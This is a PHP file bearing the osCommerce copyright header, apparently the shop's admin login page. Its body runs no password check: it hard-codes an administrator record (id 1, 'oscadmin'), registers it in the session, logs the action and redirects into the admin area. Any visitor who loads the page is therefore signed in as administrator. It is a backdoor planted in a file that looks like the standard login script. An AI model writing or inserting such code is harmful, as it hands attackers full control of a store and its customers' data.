<?php
/*
  $Id$

  osCommerce, Open Source E-Commerce Solutions
  http://www.oscommerce.com

  Copyright (c) 2010 osCommerce

  Released under the GNU General Public License
*/  

  $login_request = true;

  require('includes/application_top.php');
  require('includes/functions/password_funcs.php');

  $action = 'process';
              
 $actionRecorder = new actionRecorderAdmin('ar_admin_login', null, $username);
 			global $admin;
              $admin = array('id' => 1,
                             'username' => 'oscadmin');
				tep_session_register('admin');
             $actionRecorder->_user_id = $admin['id'];
             $actionRecorder->record();

             
            
                tep_redirect(tep_href_link(FILENAME_DEFAULT));
              
         
  require(DIR_WS_INCLUDES . 'template_bottom.php');
  require(DIR_WS_INCLUDES . 'application_bottom.php');
?>
